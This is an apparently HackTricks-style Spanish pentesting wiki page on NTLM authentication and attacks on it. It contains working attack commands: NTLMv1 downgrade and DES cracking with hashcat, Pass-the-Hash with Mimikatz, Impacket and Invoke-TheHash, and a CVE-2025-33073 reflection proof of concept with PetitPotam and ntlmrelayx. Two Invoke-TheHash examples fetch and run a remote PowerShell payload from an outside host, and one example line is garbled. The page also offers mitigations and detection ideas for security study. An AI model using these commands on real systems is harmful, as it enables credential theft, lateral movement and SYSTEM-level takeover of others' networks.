# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Información básica

En entornos donde se utilizan **Windows XP y Server 2003**, se emplean hashes LM (Lan Manager), aunque es ampliamente reconocido que estos pueden comprometerse fácilmente. Un hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica que LM no se está utilizando; representa el hash de una cadena vacía.

De forma predeterminada, el protocolo de autenticación **Kerberos** es el método principal. NTLM (NT LAN Manager) interviene en circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, fallo de Kerberos debido a una configuración incorrecta o conexiones realizadas mediante una dirección IP en lugar de un nombre de host válido.

La presencia del encabezado **"NTLMSSP"** en los paquetes de red indica que se está llevando a cabo un proceso de autenticación NTLM.

La compatibilidad con los protocolos de autenticación LM, NTLMv1 y NTLMv2 la proporciona una DLL específica ubicada en `%windir%\Windows\System32\msv1\_0.dll`.

**Puntos clave**:

- Los hashes LM son vulnerables y un hash LM vacío (`AAD3B435B51404EEAAD3B435B51404EE`) indica que no se utiliza.
- Kerberos es el método de autenticación predeterminado; NTLM solo se utiliza en determinadas condiciones.
- Los paquetes de autenticación NTLM se identifican por el encabezado "NTLMSSP".
- Los protocolos LM, NTLMv1 y NTLMv2 son compatibles con el archivo del sistema `msv1\_0.dll`.

## LM, NTLMv1 y NTLMv2

Puedes comprobar y configurar qué protocolo se utilizará:

### Interfaz gráfica

Ejecuta _secpol.msc_ -> Directivas locales -> Opciones de seguridad -> Seguridad de red: nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5).

![LM, NTLMv1 y NTLMv2 - Interfaz gráfica: Ejecuta secpol.msc - Directivas locales - Opciones de seguridad - Seguridad de red: nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5)](<../../images/image (919).png>)

### Registro

Esto establecerá el nivel 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Valores posibles:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Esquema básico de autenticación de dominio NTLM

1. El **usuario** introduce sus **credenciales**
2. La máquina cliente **envía una solicitud de autenticación** con el **nombre de dominio** y el **nombre de usuario**
3. El **servidor** envía el **challenge**
4. El **cliente cifra** el **challenge** usando como clave el hash de la contraseña y lo envía como respuesta
5. El **servidor envía** al **controlador de dominio** el **nombre de dominio, el nombre de usuario, el challenge y la respuesta**. Si **no** hay un Active Directory configurado o el nombre de dominio es el nombre del servidor, las credenciales se **comprueban localmente**.
6. El **controlador de dominio comprueba si todo es correcto** y envía la información al servidor

El **servidor** y el **controlador de dominio** pueden crear un **Secure Channel** mediante el servidor **Netlogon**, ya que el controlador de dominio conoce la contraseña del servidor (está dentro de la base de datos **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es como la mencionada **anteriormente, pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse, almacenado en el archivo **SAM**. Así que, en lugar de consultar al controlador de dominio, el **servidor comprobará por sí mismo** si el usuario puede autenticarse.

### Challenge de NTLMv1

La **longitud del challenge es de 8 bytes** y la **respuesta tiene 24 bytes**.

El **hash NT (16 bytes)** se divide en **3 partes de 7 bytes cada una** (7B + 7B + (2B+0x00\*5)): la **última parte se rellena con ceros**. Luego, el **challenge** se **cifra por separado** con cada parte y los bytes cifrados **resultantes** se **unen**. Total: 8B + 8B + 8B = 24Bytes.

**Problemas**:

- Falta de **aleatoriedad**
- Las 3 partes se pueden **atacar por separado** para encontrar el hash NT
- **DES se puede descifrar**
- La 3.ª clave siempre está compuesta por **5 ceros**.
- Dado el **mismo challenge**, la **respuesta** será **la misma**. Así que puedes enviarle a la víctima la cadena "**1122334455667788**" como **challenge** y atacar la respuesta usando **rainbow tables precalculadas**.

### Ataque NTLMv1

La delegación sin restricciones es menos común en entornos modernos, pero todavía se puede abusar de un servicio **Print Spooler** accesible para forzar la autenticación hacia dicho host.

Podrías abusar de algunas credenciales o sesiones que ya tengas en el AD para **pedirle a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder`, puedes **configurar el challenge de autenticación como 1122334455667788**, capturar el intento de autenticación y, si se realizó con **NTLMv1**, podrás **descifrarlo**.\
Si usas `responder`, podrías intentar **usar la opción `--lm`** para intentar **degradar** la **autenticación**.\
_Ten en cuenta que, para esta técnica, la autenticación debe realizarse con NTLMv1 (NTLMv2 no es válido)._

Recuerda que la impresora usará la cuenta de equipo durante la autenticación, y las cuentas de equipo usan **contraseñas largas y aleatorias** que **probablemente no podrás descifrar** usando **diccionarios** comunes. Pero la autenticación **NTLMv1** **usa DES** ([más información aquí](#ntlmv1-challenge)), así que podrás descifrarla usando servicios dedicados especialmente a descifrar DES (puedes usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com), por ejemplo).

### Ataque NTLMv1 con hashcat

NTLMv1 también se puede atacar con [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), que convierte los mensajes NTLMv1 capturados a formatos compatibles con Hashcat.<sup>[[1]](#references)</sup>

El comando

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

generaría lo siguiente:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Crea un archivo con el contenido de:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Ejecuta hashcat (lo mejor es distribuir la carga mediante una herramienta como hashtopolis), ya que de lo contrario tardará varios días.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

En este caso sabemos que la contraseña de esto es password, así que vamos a hacer trampa para la demostración:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Ahora necesitamos usar las hashcat-utilities para convertir las claves DES crackeadas en partes del hash NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Por último, la última parte:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Combínalos:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Desafío NTLMv2

La **longitud del desafío es de 8 bytes** y se envían **2 respuestas**: una tiene **24 bytes** y la longitud de la **otra** es **variable**.

**La primera respuesta** se crea cifrando con **HMAC_MD5** la **cadena** compuesta por el **cliente y el dominio**, y usando como **clave** el **hash MD4** del **hash NT**. Luego, el **resultado** se usa como **clave** para cifrar el **desafío** con **HMAC_MD5**. A esto se le añade un desafío del cliente de 8 bytes. Total: 24 B.

**La segunda respuesta** se crea usando **varios valores** (un nuevo desafío del cliente, una **marca de tiempo** para evitar **ataques de repetición**...)

Si tienes un **PCAP que contiene un intercambio de autenticación exitoso**, extrae el dominio, el nombre de usuario, el desafío del servidor y la respuesta NTLMv2, da formato a la captura para Hashcat y usa el modo `5600` para intentar recuperar la contraseña. La guía práctica archivada conserva el procedimiento para extraer los campos de los paquetes, mientras que los ejemplos de Hashcat definen el formato aceptado actualmente.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Una vez que tengas el hash de la víctima**, puedes usarlo para **suplantarla**.\
Necesitas usar una **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear un nuevo **sessionlogon** e **inyectar** ese **hash** en **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, se use ese **hash**. Esto último es lo que hace mimikatz.

**Recuerda que también puedes realizar ataques Pass-the-Hash usando cuentas de equipo.**

### **Mimikatz**

**Debe ejecutarse como administrador**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Esto inicia un proceso con el usuario local actual, mientras que LSASS asocia las credenciales proporcionadas con su inicio de sesión de red saliente. Luego puedes acceder a recursos de red como el usuario proporcionado, de forma similar a `runas /netonly`, sin conocer la contraseña en texto plano.

### Pass-the-Hash desde Linux

Puedes obtener ejecución de código en máquinas Windows usando Pass-the-Hash desde Linux.\
[**Consulta ejemplos prácticos de ejecución de Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Herramientas compiladas de Impacket para Windows

Puedes descargar [los binarios de Impacket para Windows aquí](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (En este caso, debes especificar un comando; cmd.exe y powershell.exe no son válidos para obtener un shell interactivo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Hay varios binarios más de Impacket...

### Invoke-TheHash

Puedes obtener los scripts de PowerShell aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Esta función combina los modos anteriores. Puedes especificar **varios hosts**, excluir destinos seleccionados y elegir _SMBExec, WMIExec, SMBClient_ o _SMBEnum_. Si seleccionas **SMBExec** o **WMIExec** sin un parámetro _**Command**_, solo comprueba si tienes permisos suficientes.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Debe ejecutarse como administrador**

Esta herramienta hace lo mismo que mimikatz (modifica la memoria de LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ejecución remota manual de Windows con nombre de usuario y contraseña


{{#ref}}
../lateral-movement/
{{#endref}}

## Extracción de credenciales de un host Windows

Para obtener más información, consulta [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Ataque Internal Monologue

El Internal Monologue Attack es una técnica sigilosa de extracción de credenciales que permite a un atacante obtener hashes NTLM de la máquina de una víctima **sin interactuar directamente con el proceso LSASS**. A diferencia de Mimikatz, que lee hashes directamente de la memoria y suele ser bloqueado por soluciones de seguridad de endpoints o Credential Guard, este ataque aprovecha **llamadas locales al paquete de autenticación NTLM (MSV1_0) a través de la Security Support Provider Interface (SSPI)**. Primero, el atacante **degrada la configuración de NTLM** (p. ej., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para permitir NetNTLMv1. Luego suplanta tokens de usuario existentes obtenidos de procesos en ejecución y activa la autenticación NTLM localmente para generar respuestas NetNTLMv1 mediante un desafío conocido.<sup>[[4]](#references)</sup>

Después de capturar estas respuestas NetNTLMv1, el atacante puede recuperar rápidamente los hashes NTLM originales mediante **tablas rainbow precalculadas**, lo que permite realizar más ataques Pass-the-Hash para el movimiento lateral. Es crucial que el Internal Monologue Attack siga siendo sigiloso porque no genera tráfico de red, inyecta código ni activa volcados directos de memoria, por lo que es más difícil de detectar para los defensores que métodos tradicionales como Mimikatz.

Si NetNTLMv1 no se acepta debido a políticas de seguridad aplicadas, es posible que el atacante no pueda obtener una respuesta NetNTLMv1.

Para abordar este caso, se actualizó la herramienta Internal Monologue: adquiere dinámicamente un token de servidor mediante `AcceptSecurityContext()` para poder **capturar respuestas NetNTLMv2** si NetNTLMv1 falla. Aunque NetNTLMv2 es mucho más difícil de crackear, todavía permite realizar ataques de relay o fuerza bruta offline en casos limitados.

El PoC está disponible en **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay y Responder

**Lee una guía más detallada sobre cómo realizar esos ataques aquí:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analizar desafíos NTLM de una captura de red

**Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* de NTLM y Kerberos mediante SPNs serializados (CVE-2025-33073)

Windows incluye varias mitigaciones que intentan prevenir ataques de *reflection*, en los que una autenticación NTLM (o Kerberos) originada en un host se retransmite al **mismo** host para obtener privilegios de SYSTEM.  

Microsoft rompió la mayoría de las cadenas públicas con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) y parches posteriores; sin embargo, **CVE-2025-33073** demuestra que aún es posible eludir las protecciones abusando de cómo el **cliente SMB trunca los Service Principal Names (SPNs)** que contienen información de destino *marshalled* (serializada).<sup>[[5]](#references)[[6]](#references)</sup>

### Resumen del fallo
1. Un atacante registra un **registro DNS A** cuya etiqueta codifica un SPN marshalled; por ejemplo:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Se fuerza a la víctima a autenticarse en ese nombre de host (PetitPotam, DFSCoerce, etc.).
3. Cuando el cliente SMB pasa la cadena de destino `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la llamada a `CredUnmarshalTargetInfo` **elimina** el blob serializado y deja **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o su equivalente de Kerberos) ahora considera que el destino es *localhost* porque la parte corta del nombre de host coincide con el nombre del equipo (`SRV1`).
5. En consecuencia, el servidor establece `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inyecta el **token de acceso SYSTEM de LSASS** en el contexto (para Kerberos, se crea una clave de subsesión marcada como SYSTEM).
6. Retransmitir esa autenticación con `ntlmrelayx.py` **o** `krbrelayx.py` otorga todos los privilegios de SYSTEM en el mismo host.<sup>[[5]](#references)</sup>

### PoC rápida
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Parches y mitigaciones
* El parche KB para **CVE-2025-33073** añade una comprobación en `mrxsmb.sys::SmbCeCreateSrvCall` que bloquea cualquier conexión SMB cuyo destino contenga información marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Exige **SMB signing** en los destinos de relay SMB. Para otros destinos, evalúa los requisitos de signing o Extended Protection propios de ese protocolo y su nivel de parche; SMB signing por sí solo no determina si es posible un relay de HTTPS WinRM.
* Supervisa registros DNS que se parezcan a `*<base64>...*` y bloquea vectores de coerción (PetitPotam, DFSCoerce, AuthIP...).

### Ideas de detección
* Capturas de red con `NTLMSSP_NEGOTIATE_LOCAL_CALL` donde la IP del cliente ≠ la IP del servidor.
* AP-REQ de Kerberos que contenga una clave de subsesión y un principal de cliente igual al hostname.
* Inicios de sesión SYSTEM de Windows Event 4624/4648 seguidos inmediatamente por escrituras SMB remotas desde el mismo host.<sup>[[5]](#references)</sup>

Un nombre DNS serializado con información de destino también puede dirigir la autenticación forzada hacia un atacante para un **relay entre protocolos** a un endpoint de inscripción web de AD CS. Este resultado es distinto de la reflexión en el mismo host: las [condiciones de inscripción ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), los permisos de escritura DNS, una ruta de coerción y el nivel de parche del destino deben evaluarse de forma independiente.

Para la variante de reflexión local de **marzo de 2026**, que abusa de **puertos arbitrarios de SMB** y la **reutilización de conexiones TCP** para llegar a `NT AUTHORITY\SYSTEM`, consulta:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Multiherramienta NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashes de ejemplo de Hashcat – NetNTLMv2 (modo 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Utilidades de Pass The Hash para PowerShell](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Ataque Internal Monologue: obtención de hashes NTLM sin acceder a LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [La reflexión NTLM ha muerto, ¡larga vida a la reflexión NTLM!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Descifrar un hash NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
